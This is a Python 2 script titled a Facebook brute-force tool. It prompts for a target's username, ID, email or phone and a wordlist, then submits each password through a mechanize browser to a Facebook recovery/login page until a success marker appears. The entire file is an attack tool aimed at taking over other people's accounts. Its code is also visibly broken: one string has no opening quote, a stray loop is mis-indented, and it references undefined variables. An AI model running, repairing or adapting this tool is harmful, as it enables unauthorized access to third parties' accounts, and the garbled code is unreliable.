#!/usr/bin/python
# -*- coding: utf-8 -*-
        #############################################
        #                                           #
        #       Facebook BruteForce, by 0ssama      #
        #       Contact: 0ssama@protonmail.com      #
        #                                           #
        #############################################


import time
import os

os.system('clear')
time.sleep(0.5)
try:
    import mechanize
except ModuleNotFoundError:
    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
    exit()

time.sleep(0.5)
user = raw_input('[?] Target Username/ID/Email/phone >>> ')
time.sleep(0.8)
wrdlstFileName = raw_input('\n[?] wordlist.txt >>> ')
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('\n[!] File Not Found!')
    exit()

time.sleep(0.8)
print '\n\nCracking '+user+' Now...'

time.sleep(1)
print '\n#############################################\n'
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
            fb = browser.open(https://m.facebook.com/recover/password/?u=&n=000000&c=https%3A%2F%2Fm.facebook.com%2Flogin%2Fdevice-based%2Fpassword%2F%3Fuid%3D100046973880327%26flow%3Dlogin_no_pin%26refsrc%3Ddeprecated&ars=device_based_login&fl=default_recover&sih=0&msgr=0&_rdr')
            number=0
while number != 999999:
    number=number+1
    print(number)
            dos = open('Facebook-Log.txt', 'w+')
            browser.set('Press your u')   
                 
            browser.select_form(nr=0)
            browser.form['u'] = uid 
            browser.form['pass'] = n
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://m.facebook.com/recover/password/?u=&n=000000&c=https%3A%2F%2Fm.facebook.com%2Flogin%2Fdevice-based%2Fpassword%2F%3Fuid%3D100046973880327%26flow%3Dlogin_no_pin%26refsrc%3Ddeprecated&ars=device_based_login&fl=default_recover&sih=0&msgr=0&_rdr').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print '[+] Password ditemukan > '+password 
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print "[!] Password ini salah! > "+str(password)
        except KeyboardInterrupt:
            print '\n#############################################\n   Exiting..'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()

time.sleep(1)
print 'maaf, tidak ada satupun passwrd yg bener.'
time.sleep(0.8)
print '\n[?] Coba racik wordlist sendiri gan.'
time.sleep(0.8)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()
